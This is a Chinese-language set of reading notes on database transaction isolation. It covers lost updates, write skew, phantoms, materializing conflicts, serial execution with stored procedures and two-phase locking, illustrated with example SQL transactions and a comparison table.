<p>不幸的是，<mark style="background: #FFF3A3A6;">SQL 标准对隔离级别的定义是有缺陷的 —— 模糊，不精确</mark>，并不像标准应有的一样，独立于实现。有几个数据库实现了可重复读，但它们实际提供的保证存在很大的差异，尽管表面上是标准化的【23】。在研究文献【29,30】中已经有了可重复读的正式定义，但大多数的实现并不能满足这个正式定义。最后，IBM DB2 使用 “可重复读” 来引用可串行化【8】。</p>
<p>到最后，<mark style="background: #FFF3A3A6;">没有人真正知道可重复读的意思</mark>。</p>
<h3 id="防止丢失更新"><strong>防止丢失更新</strong></h3>
<p>到目前为止已经讨论的<strong>读已提交</strong>和<strong>快照隔离</strong>级别：</p>
<ul>
<li>主要保证了<strong>只读事务在并发写入时</strong>可以看到什么，处理读写冲突</li>
<li>两个事务并发写入的问题，只讨论了脏写，忽视了其他问题</li>
</ul>
<p>并发的写入事务之间还有其他几种有趣的冲突。其中最著名的是<strong>丢失更新（lost update）</strong>&nbsp; 问题，典型的例子如并发更新计数器。</p>
<p>两个事务同时从数据库中读取值，修改它并先后写回修改的值（a <mark style="background: #FFF3A3A6;">read-modify-write</mark> cycle），那么第一个的修改就会丢失，因为第二个写入的内容并没有包括第一个事务的修改。这种模式发生在各种不同的情况下：</p>
<ul>
<li>增加计数器或更新账户余额（需要读取当前值，计算新值并写回更新后的值）</li>
<li>在复杂值中进行本地修改：例如，将元素添加到 JSON 文档中的一个列表（需要解析文档，进行更改并写回修改的文档）</li>
<li>两个用户同时编辑 wiki 页面，每个用户通过将整个页面内容发送到服务器来保存其更改，覆写数据库中当前的任何内容。</li>
</ul>
<p>这是一个普遍的问题，所以已经开发了各种解决方案。</p>
<h4 id="原子写"><strong>原子写</strong></h4>
<p>许多数据库提供了原子更新操作，从而消除了在应用程序代码中执行读取 - 修改 - 写入序列的需要。<mark style="background: #BBFABBA6;">如果代码可以用这些操作来表达，这通常是最好的解决方案</mark>。例如，下面的指令在大多数关系数据库中是并发安全的：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">UPDATE counters <span class="keyword">SET</span> <span class="keyword">value</span> <span class="operator">=</span> <span class="keyword">value</span> <span class="operator">+</span> <span class="number">1</span> <span class="keyword">WHERE</span> key <span class="operator">=</span> <span class="string">'foo'</span>;</span><br></pre></td></tr></tbody></table></figure>
<p>原子操作通常通过<mark style="background: #BBFABBA6;">在读取对象时，获取排它锁</mark>来实现，以便更新完成之前没有其他事务可以读取它。这种技术有时被称为 &nbsp;<strong>游标稳定性（cursor stability）</strong>【36,37】。</p>
<p>不幸的是，<mark style="background: #FFF3A3A6;">ORM 框架很容易意外地执行不安全的读取 - 修改 - 写入序列</mark>，而不是使用数据库提供的原子操作，经常产生那种很难测出来的微妙 Bug。</p>
<h4 id="显式锁定"><strong>显式锁定</strong></h4>
<p>如果数据库没有内置提供原子操作，防止丢失更新的另一个选择是让应用程序显式地锁定将要更新的对象。然后应用程序可以执行读取 - 修改 - 写入序列，如果任何其他事务尝试同时读取同一个对象，则强制等待，直到第一个<strong>读取 - 修改 - 写入序列</strong>完成。</p>
<p>例如，考虑一个多人游戏，其中几个玩家可以同时移动相同的棋子。在这种情况下，一个原子操作可能是不够的。但<mark style="background: #BBFABBA6;">可以使用锁来防止两名玩家同时移动相同的棋子</mark>，如例 7-1 所示。</p>
<p><strong>例 7-1 显式锁定行以防止丢失更新</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRANSACTION;</span><br><span class="line"><span class="comment">-- 对 222 这局游戏的 robot 棋子加锁</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> figures</span><br><span class="line">    <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">'robot'</span> <span class="keyword">AND</span> game_id <span class="operator">=</span> <span class="number">222</span></span><br><span class="line"><span class="keyword">FOR</span> UPDATE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 检查玩家的操作是否有效，然后更新先前SELECT返回棋子的位置。</span></span><br><span class="line">UPDATE figures <span class="keyword">SET</span> position <span class="operator">=</span> <span class="string">'c4'</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>FOR UPDATE</code> 子句告诉数据库应该<mark style="background: #FFF3A3A6;">对该查询返回的所有行加锁</mark>。</li>
</ul>
<p>这是有效的，但做对需要仔细考虑应用逻辑。忘记在代码某处加锁很容易引入竞争条件。</p>
<h4 id="自动检测丢失更新"><strong>自动检测丢失更新</strong></h4>
<p>原子操作和锁是通过强制<strong>读取 - 修改 - 写入序列</strong>按顺序发生，来防止丢失更新的方法。另一种方法是允许它们并行执行，如果<mark style="background: #BBFABBA6;">事务管理器检测到丢失更新</mark>，则<mark style="background: #FFF3A3A6;">中止事务</mark>并强制它们重试其<strong>读取 - 修改 - 写入序列</strong>。</p>
<p>这种方法的一个优点是，<mark style="background: #BBFABBA6;">数据库可以结合快照隔离高效地执行此检查，只需要检查 read 和 write 覆盖的版本是否一致即可。</mark></p>
<p>事实上，PostgreSQL 的可重复读，Oracle 的可串行化和 SQL Server 的快照隔离级别，都会自动检测到丢失更新，并中止惹麻烦的事务。但是，MySQL/InnoDB 的可重复读并不会检测<strong>丢失更新</strong>。一些作者认为，数据库必须能防止丢失更新才称得上是提供了<strong>快照隔离</strong>，所以在这个定义下，MySQL 下不提供快照隔离。</p>
<p>丢失更新检测是一个很好的功能，因为它不需要应用代码使用任何特殊的数据库功能，你可能会忘记使用锁或原子操作，从而引入错误；但丢失更新的检测是自动发生的，因此不太容易出错。</p>
<h4 id="比较并设置cas"><strong>比较并设置（CAS）</strong></h4>
<p>在不提供事务的数据库中，有时会发现一种原子操作：<strong>比较并设置（CAS, Compare And Set）：</strong></p>
<ul>
<li>此操作的目的是为了避免丢失更新：<mark style="background: #BBFABBA6;">只有当前值从上次读取时一直未改变，才允许更新发生</mark></li>
<li><mark style="background: #FFF3A3A6;">如果当前值与先前读取的值不匹配，则更新不起作用</mark>，且必须重试读取 - 修改 - 写入序列</li>
</ul>
<p>例如，为了防止两个用户同时更新同一个 wiki 页面，可以尝试类似这样的方式，只有当用户开始编辑页面内容时，才会发生更新：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">-- 根据数据库的实现情况，这可能也可能不安全</span></span><br><span class="line">UPDATE wiki_pages <span class="keyword">SET</span> content <span class="operator">=</span> <span class="string">'新内容'</span></span><br><span class="line">  <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1234</span> <span class="keyword">AND</span> content <span class="operator">=</span> <span class="string">'旧内容'</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>如果内容已经更改并且不再与 “旧内容” 相匹配，则此更新将不起作用，因此需要检查更新是否生效，必要时重试。</p>
<ul>
<li>但是，<mark style="background: #FFF3A3A6;">如果数据库允许 <code>WHERE</code> 子句从旧快照中读取，则此语句可能无法防止丢失更新</mark>，因为即使发生了另一个并发写入，<code>WHERE</code> 条件也可能为真。在依赖数据库的 CAS 操作前要检查其是否安全。</li>
<li>Mysql 中的 update 是加锁读取的：<a href="https://dev.mysql.com/doc/refman/8.0/en/charset-general.html">MySQL :: MySQL 8.0 Reference Manual :: 12.1 Character Sets and Collations in General</a></li>
</ul>
<h4 id="冲突解决和复制"><strong>冲突解决和复制</strong></h4>
<p>在复制数据库中，存在多个数据副本，并且在不同节点上的数据可能被并发地修，防止丢失更新还需要采取一些额外的步骤来防止丢失更新。</p>
<p>锁和 CAS 操作假定有一个最新的数据副本。但是多主或无主复制的数据库通常允许多个写入并发执行，并异步复制到副本上，因此<mark style="background: #FFF3A3A6;">无法保证有一份数据的最新副本</mark>。所以<mark style="background: #FFF3A3A6;">基于锁或 CAS 操作的技术不适用于这种情况</mark>。</p>
<p>相反，这种复制数据库中的一种常见方法是<mark style="background: #BBFABBA6;">允许并发写入创建多个冲突版本的值</mark>，并使用应用代码或特殊数据结构在之后解决和合并这些版本。</p>
<p>原子操作可以在复制的上下文中很好地工作，尤其当它们具有可交换性时（即，可以在不同的副本上以不同的顺序应用它们，且仍然可以得到相同的结果）。例如，<mark style="background: #BBFABBA6;">递增计数器或向集合添加元素是可交换的操作</mark>。这是 Riak 2.0 数据类型背后的思想，它可以防止复制副本丢失更新。当不同的客户端同时更新一个值时，Riak 自动将更新合并在一起，以免丢失更新。</p>
<p>另一方面，最后写入为准（LWW）的冲突解决方法很容易丢失更新。但不幸的是，LWW 是许多复制数据库中的默认设置。</p>
<h3 id="写入偏差与幻读"><strong>写入偏差与幻读</strong></h3>
<p>当不同的事务并发地尝试写入单个对象时：会出现两种竞争条件，<strong>脏写</strong>和<strong>丢失更新</strong>的问题。既可以由数据库自动解决，也可以通过锁和原子写操作手动防止。</p>
<p>但是，并发写入间可能发生的竞争条件，可能还会<mark style="background: #FFF3A3A6;">涉及多个不同对象</mark>。</p>
<p>考虑医生值班（on-call）场景。医院通常会同时要求几位医生待命，但<strong>至少有一位医生在待命</strong>。医生可以放弃他们的班次（shift），例如他们生病了，只要满足至少有一个同事在这一班中继续工作。</p>
<p>现在想象一下，Alice 和 Bob 是两位值班医生。两人都感到不适，所以他们都决定请假。不幸的是，他们恰好在同一时间点击按钮下班，如图 7-8 所示。</p>
<p><img src="ch07-fig08.png"> <strong>图 7-8 写入偏差导致应用程序错误的示例</strong></p>
<p>在两个事务中，应用首先检查是否有两个或以上的医生正在值班；如果是的话，它就假定一名医生可以安全地休班。由于<mark style="background: #FFF3A3A6;">数据库使用快照隔离</mark>，两次检查都返回 2 ，所以两个事务都进入下一个阶段。Alice 更新自己的记录休班了，而 Bob 也做了一样的事情。两个事务都成功提交了，现在没有医生值班了。违反了至少有一名医生在值班的要求。</p>
<h4 id="写偏差的特征"><strong>写偏差的特征</strong></h4>
<p>这种异常称为 ** 写偏差（write skew）。</p>
<ul>
<li>它既不是<strong>脏写</strong>，也不是<strong>丢失更新</strong>，因为这两个事务正在更新两个不同的对象（Alice 和 Bob 各自的待命记录）。</li>
<li>在这里发生的冲突并不是那么明显，但是这显然是一个竞争条件：<strong>如果两个事务串行运行，那么第二个医生就不能歇班了</strong>。异常行为只有在事务并发进行时才有可能。</li>
</ul>
<p>可以将<mark style="background: #FFF3A3A6;">写入偏差视为丢失更新问题的一般化</mark>。写偏差中也存在一个 read-modify-cycle，如上面的例子，读取了所有值班人，并修改写入值班状态。</p>
<ul>
<li>在快照隔离下，多事务的读写并发并不阻塞，而是读取过期的一致快照。这使得两个事务都读到了两个值班人，取消自己的值班。</li>
</ul>
<p>防止丢失更新的做法，并不完全适配写丢失问题：</p>
<ul>
<li>由于涉及多个对象，<mark style="background: #FFF3A3A6;">单对象的原子操作不起作用</mark></li>
<li>不幸的是，在一些快照隔离的实现中，<mark style="background: #FFF3A3A6;">自动检测丢失更新对此并没有帮助</mark>。在 PostgreSQL 的可重复读，MySQL/InnoDB 的可重复读，Oracle 可序列化或 SQL Server 的快照隔离级别中，都不会自动检测写入偏差【23】。<mark style="background: #BBFABBA6;">自动防止写入偏差需要真正的可序列化隔离</mark></li>
<li>某些数据库允许<strong>配置约束</strong>，然后由数据库强制执行（例如，唯一性，外键约束或特定值限制）。但是为了指定至少有一名医生必须在线，需要一个涉及多个对象的约束。<mark style="background: #FFF3A3A6;">大多数数据库没有内置对涉及多个对象约束的支持</mark>，但是可以使用触发器，或者物化视图来实现它们，这取决于不同的数据库</li>
<li>如果无法使用可序列化的隔离级别，则此情况下的<mark style="background: #BBFABBA6;">次优选项可能是显式锁定事务所依赖的行</mark>。在例子中，你可以写下如下的代码：</li>
</ul>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRANSACTION;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> doctors</span><br><span class="line">  <span class="keyword">WHERE</span> on_call <span class="operator">=</span> <span class="literal">TRUE</span></span><br><span class="line">  <span class="keyword">AND</span> shift_id <span class="operator">=</span> <span class="number">1234</span> <span class="keyword">FOR</span> UPDATE;</span><br><span class="line"></span><br><span class="line">UPDATE doctors</span><br><span class="line">  <span class="keyword">SET</span> on_call <span class="operator">=</span> <span class="literal">FALSE</span></span><br><span class="line">  <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">'Alice'</span></span><br><span class="line">  <span class="keyword">AND</span> shift_id <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>和以前一样，<code>FOR UPDATE</code> 告诉数据库锁定返回的所有行用于更新。</li>
</ul>
<h4 id="写偏差的更多例子"><strong>写偏差的更多例子</strong></h4>
<p>写偏差乍看像是一个深奥的问题，但一旦意识到这一点，很容易会注意到更多可能的情况。以下是一些例子：</p>
<p><em><strong>会议室预订系统</strong></em></p>
<p>假设你想强制执行，同一时间不能同时在两个会议室预订【43】。当有人想要预订时，首先检查是否存在相互冲突的预订（即预订时间范围重叠的同一房间），如果没有找到，则创建会议（请参见示例 7-2）。</p>
<blockquote>
<p>在 PostgreSQL 中，你可以使用范围类型优雅地执行此操作，但在其他数据库中并未得到广泛支持。</p>
</blockquote>
<p><strong>例 7-2 会议室预订系统试图避免重复预订（在快照隔离下不安全）</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRANSACTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 检查所有现存的与12:00~13:00重叠的预定</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> bookings</span><br><span class="line"><span class="keyword">WHERE</span> room_id <span class="operator">=</span> <span class="number">123</span> <span class="keyword">AND</span></span><br><span class="line">    end_time <span class="operator">&gt;</span> <span class="string">'2015-01-01 12:00'</span> <span class="keyword">AND</span> start_time <span class="operator">&lt;</span> <span class="string">'2015-01-01 13:00'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 如果之前的查询返回0</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> bookings(room_id, start_time, end_time, user_id)</span><br><span class="line">  <span class="keyword">VALUES</span> (<span class="number">123</span>, <span class="string">'2015-01-01 12:00'</span>, <span class="string">'2015-01-01 13:00'</span>, <span class="number">666</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>不幸的是，<mark style="background: #FFF3A3A6;">快照隔离并不能防止另一个用户同时插入冲突的会议</mark>。为了确保不会遇到调度冲突，需要可序列化的隔离级别。</p>
<p><em><strong>多人游戏</strong></em></p>
<p>在例 7-1 中，使用一个锁来防止丢失更新（确保两个玩家不能同时移动同一个棋子）。但是<strong>对棋子加锁并不妨碍玩家将两个不同的棋子移动到棋盘上的相同位置</strong>，或者采取其他违反游戏规则的行为。按照正在执行的规则类型，也许可以使用<strong>唯一约束</strong>，否则很容易发生写入偏差。</p>
<p><em><strong>抢注用户名</strong></em></p>
<p>在每个用户拥有唯一用户名的网站上，两个用户可能会尝试同时创建具有相同用户名的帐户。可以在事务检查名称是否被抢占，如果没有则使用该名称创建账户。但是像在前面的例子中那样，在快照隔离下这是不安全的。幸运的是，<mark style="background: #BBFABBA6;">唯一约束是一个简单的解决办法</mark>（第二个事务在提交时会因为违反用户名唯一约束而被中止）。</p>
<p><em><strong>防止账户透支</strong></em></p>
<p>允许用户花钱或积分的服务，需要检查用户的支付数额不超过其余额。可以通过在用户的帐户中插入一个试探性的消费项目来实现这一点，列出帐户中的所有项目，并检查总和是否为正值。有了写入偏差，可能会发生<mark style="background: #FFF3A3A6;">两个支出项目同时插入，一起导致余额变为负值</mark>，但这两个事务都不会注意到另一个。</p>
<h4 id="导致写入偏差的幻读"><strong>导致写入偏差的幻读</strong></h4>
<p>所有这些例子都遵循类似的模式：</p>
<ol type="1">
<li>一个 <code>SELECT</code> 查询找出符合条件的行，并检查是否符合一些要求。（例如：至少有两名医生在值班；不存在对该会议室同一时段的预定；棋盘上的位置没有被其他棋子占据；用户名还没有被抢注；账户里还有足够余额）</li>
<li>按照第一个查询的结果，应用代码决定是否继续。（可能会继续操作，也可能中止并报错）</li>
<li>如果应用决定继续操作，就执行写入（插入、更新或删除），并提交事务。 这个写入的效果<mark style="background: #FFF3A3A6;">改变了步骤 2 中的先决条件</mark>。换句话说，如果在提交写入后，重复执行一次步骤 1 的 SELECT 查询，将会得到不同的结果。因为写入改变符合搜索条件的行集（现在少了一个医生值班，那时候的会议室现在已经被预订了，棋盘上的这个位置已经被占据了，用户名已经被抢注，账户余额不够了）。</li>
</ol>
<p>这些步骤可能以不同的顺序发生。例如可以首先进行写入，然后进行 SELECT 查询，最后根据查询结果决定是放弃还是提交。</p>
<p>在医生值班的例子中，在步骤 3 中修改的行，是步骤 1 中返回的行之一，所以我们可以<mark style="background: #BBFABBA6;">通过锁定步骤 1 中的行（<code>SELECT FOR UPDATE</code>）来使事务安全并避免写入偏差</mark>。但是其他四个例子是不同的：它们检查是否<strong>不存在</strong>某些满足条件的行，写入会<strong>添加</strong>一个匹配相同条件的行。<mark style="background: #FFF3A3A6;">如果步骤 1 中的查询没有返回任何行，则 <code>SELECT FOR UPDATE</code> 锁不了任何东西</mark>。</p>
<p>这种效应：一个事务中的写入改变另一个事务的搜索查询的结果，被称为<strong>幻读</strong>【3】。快照隔离避免了只读查询中幻读，但是在读写事务中，幻读会导致特别棘手的写偏差情况。</p>
<h4 id="物化冲突"><strong>物化冲突</strong></h4>
<p>幻读的问题是没有对象可以加锁，可以人为地在数据库中引入一个锁对象。</p>
<p>例如，在会议室预订的场景中，可以想象创建一个关于时间槽和房间的表。此表中的每一行对应于特定时间段（例如 15 分钟）的特定房间。可以提前插入房间和时间的所有可能组合行（例如接下来的六个月）。</p>
<p>现在，要创建预订的事务可以<mark style="background: #FFF3A3A6;">锁定（<code>SELECT FOR UPDATE</code>）表中与所需房间和时间段对应的行</mark>。在获得锁定之后，它可以检查重叠的预订并像以前一样插入新的预订。请注意，这个表并不是用来存储预订相关的信息 —— 它完全就是一组锁，用于防止同时修改同一房间和时间范围内的预订。</p>
<p>这种方法被称为<strong>物化冲突（materializing conflicts）</strong>，因为它<mark style="background: #BBFABBA6;">将幻读变为数据库中一组具体行上的锁冲突</mark>。不幸的是，弄清楚如何<mark style="background: #FF5582A6;">物化冲突可能很难，也很容易出错，而让并发控制机制泄漏到应用数据模型是很丑陋的做法</mark>。出于这些原因，如果没有其他办法可以实现，物化冲突应被视为最后的手段。在大多数情况下。<strong>可序列化（Serializable）</strong>&nbsp; 的隔离级别是更可取的。</p>
<h2 id="可序列化"><strong>可序列化</strong></h2>
<p>总结一下已讨论的隔离级别如下表。注意写丢失问题并不是隔离级别本身解决的。</p>
<table>
<thead>
<tr class="header">
<th>隔离级别</th>
<th>描述</th>
<th>解决的问题</th>
<th>未解决的问题</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>读已提交</td>
<td>事务只能读取到其他事务已提交的对象</td>
<td>脏读、脏写</td>
<td>不可重复读、写丢失、写偏差、幻读</td>
</tr>
<tr class="even">
<td>快照隔离</td>
<td>从一致快照中读，读写互不冲突</td>
<td>脏读、脏写、不可重复读</td>
<td>写丢失、写偏差、幻读</td>
</tr>
</tbody>
</table>
<p>弱隔离级别的固有问题：</p>
<ul>
<li><strong>数据库侧</strong>：隔离级别难以理解，并且在不同的数据库中实现的不一致（例如，“可重复读” 的含义天差地别）。</li>
<li><strong>应用侧</strong>：只检查应用代码很难判断在特定的隔离级别运行是否安全。 特别是在大型应用程序中，可能并不知道并发发生的所有事情。</li>
<li><strong>工具侧</strong>：没有检测竞争条件的好工具。原则上来说，静态分析可能会有帮助，但研究中的技术还没法实际应用。并发问题的测试是很难的，因为它们通常是非确定性的 —— 只有在倒霉的时序下才会出现问题。</li>
</ul>
<p><strong>可串行化（Serializability）</strong>&nbsp; 隔离通常被认为是最强的隔离级别。它保证即使事务可以并行执行，最终的结果也与串行执行一样的，就好像它们没有任何并发性。因此数据库保证，如果事务在单独运行时正常运行，则它们在并发运行时继续保持正确 —— 换句话说，<mark style="background: #BBFABBA6;">数据库可以防止所有可能的竞争条件</mark>。</p>
<p>但可串行化也是有代价的，因此没有得到广泛使用。目前大多数提供可串行化的数据库都使用了三种技术之一：</p>
<ul>
<li>真的串行顺序执行事务</li>
<li><strong>两阶段锁定（2PL, two-phase locking）</strong>，几十年来唯一可行的选择</li>
<li>乐观并发控制技术，例如 &nbsp;<strong>可串行化快照隔离</strong>（serializable snapshot isolation）</li>
</ul>
<p>现在将主要在单节点数据库的背景下讨论这些技术；在第九章中，我们将研究如何将它们推广到涉及分布式系统中多个节点的事务。</p>
<h3 id="真的串行执行">真的串行执行</h3>
<p>避免并发问题的最简单方法就是完全不要并发：在单个线程上按顺序串行执行事务，这正是可串行化的定义。</p>
<p>尽管这似乎是一个明显的主意，但数据库设计人员只是在 2007 年左右才决定，单线程循环执行事务是可行的【45】。如果多线程并发在过去的 30 年中被认为是获得良好性能的关键所在，那么究竟是什么改变致使单线程执行变为可能呢？</p>
<p>两个进展引发了这个反思：</p>
<ul>
<li>RAM 足够便宜了，许多场景现在都可以<mark style="background: #BBFABBA6;">将完整的活跃数据集保存在内存中</mark>。当事务需要访问的所有数据都在内存中时，事务处理的执行速度要比等待数据从磁盘加载时快得多。</li>
<li>数据库设计人员意识到<mark style="background: #BBFABBA6;"> OLTP 事务通常很短，而且只进行少量的读写操作</mark>。相比之下，长时间运行的分析查询通常是只读的，因此它们可以在串行执行循环之外的一致快照（使用快照隔离）上运行。</li>
</ul>
<p>串行执行事务的方法在 VoltDB/H-Store，Redis 和 Datomic 中实现。设计用于单线程执行的系统有时可以比支持并发的系统性能更好，因为它可以<mark style="background: #BBFABBA6;">避免锁的协调开销</mark>。但是其<mark style="background: #FF5582A6;">吞吐量仅限于单个 CPU 核的吞吐量</mark>。为了充分利用单一线程，需要与传统形式的事务不同的结构。</p>
<h4 id="在存储过程中封装事务">在存储过程中封装事务</h4>
<p>在数据库的早期阶段，意图是数据库<mark style="background: #FFF3A3A6;">事务可以包含整个用户活动流程</mark>。例如，预订机票是一个多阶段的过程（搜索路线，票价和可用座位，决定行程，在每段行程的航班上订座，输入乘客信息，付款）。数据库设计者认为，如果整个过程是一个事务，那么它就可以被原子化地执行。</p>
<p>不幸的是，<mark style="background: #FFF3A3A6;">人类做出决定和回应的速度非常缓慢</mark>。如果数据库事务需要等待来自用户的输入，则数据库需要支持潜在的大量并发事务，其中大部分是空闲的。大多数数据库不能高效完成这项工作，因此几乎所有的 OLTP 应用程序都避免在事务中等待交互式的用户输入，以此来保持事务的简短。在 Web 上，这意味着事务在同一个 HTTP 请求中被提交 —— <mark style="background: #FFF3A3A6;">一个事务不会跨越多个请求</mark>。一个新的 HTTP 请求开始一个新的事务。</p>
<p>即使已经将人类从关键路径中排除，<mark style="background: #FF5582A6;">事务仍然以交互式的客户端 / 服务器风格执行</mark>，一次一个语句。应用程序进行查询，读取结果，可能根据第一个查询的结果进行另一个查询，依此类推。查询和结果在应用程序代码（在一台机器上运行）和数据库服务器（在另一台机器上）之间来回发送。</p>
<p>在这种交互式的事务方式中，<mark style="background: #FF5582A6;">应用程序和数据库之间的网络通信耗费了大量的时间</mark>。如果不允许在数据库中进行并发处理，且一次只处理一个事务，则吞吐量将会非常糟糕，因为数据库大部分的时间都花费在等待应用程序发出当前事务的下一个查询。在这种数据库中，为了获得合理的性能，需要同时处理多个事务。</p>
<p>出于这个原因，具有单线程串行事务处理的系统不允许交互式的多语句事务。取而代之，<mark style="background: #BBFABBA6;">应用程序必须提前将整个事务代码作为存储过程提交给数据库</mark>。这些方法之间的差异如 &nbsp; 图 7-9 所示。如果事务所需的所有数据都在内存中，则存储过程可以非常快地执行，而不用等待任何网络或磁盘 I/O。</p>
<p><img src="ch07-fig09.png"></p>
<p><strong>图 7-9 交互式事务和存储过程之间的区别（使用图 7-8 的示例事务）</strong></p>
<h4 id="存储过程的优点和缺点">存储过程的优点和缺点</h4>
<p>存储过程在关系型数据库中已经存在了一段时间了，自 1999 年以来它们一直是 SQL 标准（SQL/PSM）的一部分。出于各种原因，它们的名声有点不太好：</p>
<ul>
<li>每个数据库厂商都有自己的存储过程语言（Oracle 有 PL/SQL，SQL Server 有 T-SQL，PostgreSQL 有 PL/pgSQL 等）。这些语言并没有跟上通用编程语言的发展，所以从今天的角度来看，它们看起来<mark style="background: #FF5582A6;">相当丑陋和陈旧</mark>，而且缺乏大多数编程语言中能找到的库的生态系统。</li>
<li>在<mark style="background: #FF5582A6;">数据库中运行的代码难以管理</mark>：与应用服务器相比，它更难调试，更难以保持版本控制和部署，更难测试，并且难以集成到指标收集系统来进行监控。</li>
<li>数据库通常比应用服务器对性能敏感的多，因为单个数据库实例通常由许多应用服务器共享。数据库中<mark style="background: #FF5582A6;">一个写得不好的存储过程</mark>（例如，占用大量内存或 CPU 时间）会比在应用服务器中相同的代码<mark style="background: #FF5582A6;">造成更多的麻烦</mark>。</li>
</ul>
<p>但是这些问题都是可以克服的。现代的存储过程实现放弃了 PL/SQL，而是使用现有的通用编程语言：VoltDB 使用 Java 或 Groovy，Datomic 使用 Java 或 Clojure，而<mark style="background: #FFF3A3A6;"> Redis 使用 Lua</mark>。</p>
<p><strong>存储过程与内存存储</strong>，使得在单个线程上执行所有事务变得可行。由于不需要等待 I/O，且避免了并发控制机制的开销，它们可以在单个线程上实现相当好的吞吐量。</p>
<p>VoltDB 还使用存储过程进行复制：但不是将事务的写入结果从一个节点复制到另一个节点，而是在每个节点上执行相同的存储过程。因此 VoltDB 要求存储过程是 &nbsp;<strong>确定性的</strong>（在不同的节点上运行时，它们必须产生相同的结果）。举个例子，如果事务需要使用当前的日期和时间，则必须通过特殊的确定性 API 来实现。</p>
<h4 id="分区">分区</h4>
<p>顺序执行所有事务使并发控制简单多了，但数据库的事务吞吐量被限制为单机单核的速度。只读事务可以使用快照隔离在其它地方执行，但对于写入吞吐量较高的应用，单线程事务处理器可能成为一个严重的瓶颈。</p>
<p>为了伸缩至多个 CPU 核心和多个节点，可以对数据进行分区，在 VoltDB 中支持这样做。如果你可以找到一种对数据集进行分区的方法，<mark style="background: #FFF3A3A6;">以便每个事务只需要在单个分区中读写数据</mark>，那么每个分区就可以拥有自己独立运行的事务处理线程。在这种情况下可以为每个分区指派一个独立的 CPU 核，事务吞吐量就可以与 CPU 核数保持线性伸缩。</p>
<p>但是，对于需要访问多个分区的任何事务，数据库必须在触及的所有分区之间协调事务。存储过程需要跨越所有分区锁定执行，以确保整个系统的可串行性。</p>
<p><mark style="background: #FF5582A6;">跨分区事务具有额外的协调开销，所以它们比单分区事务慢得多</mark>。 VoltDB 报告的吞吐量大约是每秒 1000 个跨分区写入，比单分区吞吐量低几个数量级，并且不能通过增加更多的机器来增加吞吐量【49】。</p>
<p>事务是否可以是划分至单个分区很大程度上取决于应用数据的结构。简单的键值数据通常可以非常容易地进行分区，但是具有多个次级索引的数据可能需要大量的跨分区协调。</p>
<h4 id="串行执行小结">串行执行小结</h4>
<p>在特定约束条件下，真的串行执行事务，已经成为一种实现可串行化隔离等级的可行办法。</p>
<ul>
<li>每个事务都必须<mark style="background: #FFF3A3A6;">小而快</mark>，只要有一个缓慢的事务，就会拖慢所有事务处理。</li>
<li><mark style="background: #FFF3A3A6;">仅限于活跃数据集可以放入内存</mark>的情况。很少访问的数据可能会被移动到磁盘，但如果需要在单线程执行的事务中访问，系统就会变得非常慢。
<ul>
<li>如果事务需要访问不在内存中的数据，最好的解决方案可能是中止事务，异步地将数据提取到内存中，同时继续处理其他事务，然后在数据加载完毕时重新启动事务。这种方法被称为 &nbsp;<strong>反缓存（anti-caching）</strong>。</li>
</ul></li>
<li><mark style="background: #FFF3A3A6;">写入吞吐量必须低到能在单个 CPU 核上处理</mark>，如若不然，事务需要能划分至单个分区，且不需要跨分区协调。</li>
<li>跨分区事务是可能的，但是它们能被使用的程度有很大的限制。</li>
</ul>
<h3 id="两阶段锁定">两阶段锁定</h3>
<p>大约 30 年来，在数据库中只有一种广泛使用的串行化算法：<strong>两阶段锁定（2PL，two-phase locking）</strong></p>
<ul>
<li>有时也称为 &nbsp;<strong>严格两阶段锁定（SS2PL, strong strict two-phase locking）</strong>，以便和其他 2PL 变体区分。</li>
</ul>
<blockquote>
<p>2PL 不是 2PC 请注意，虽然两阶段锁定（2PL）听起来非常类似于两阶段提交（2PC），但它们是完全不同的东西。</p>
</blockquote>
<p>之前我们看到锁通常用于防止脏写：如果两个事务同时尝试写入同一个对象，则锁可确保第二个写入必须等到第一个写入完成事务（中止或提交），然后才能继续。</p>
<p>两阶段锁定类似，但是锁的要求更强得多。只要没有写入，就允许多个事务同时读取同一个对象。但对象只要有写入（修改或删除），就需要 &nbsp;<strong>独占访问（exclusive access）</strong>&nbsp; 权限：</p>
<ul>
<li>如果事务 A 读取了一个对象，并且事务 B 想要写入该对象，那么 B 必须等到 A 提交或中止才能继续（这确保 B 不能在 A 底下意外地改变对象）。</li>
<li>如果事务 A 写入了一个对象，并且事务 B 想要读取该对象，则 B 必须等到 A 提交或中止才能继续（像 &nbsp; 图 7-1 那样<mark style="background: #FFF3A3A6;">读取旧版本的对象在 2PL 下是不可接受的</mark>）。</li>
</ul>
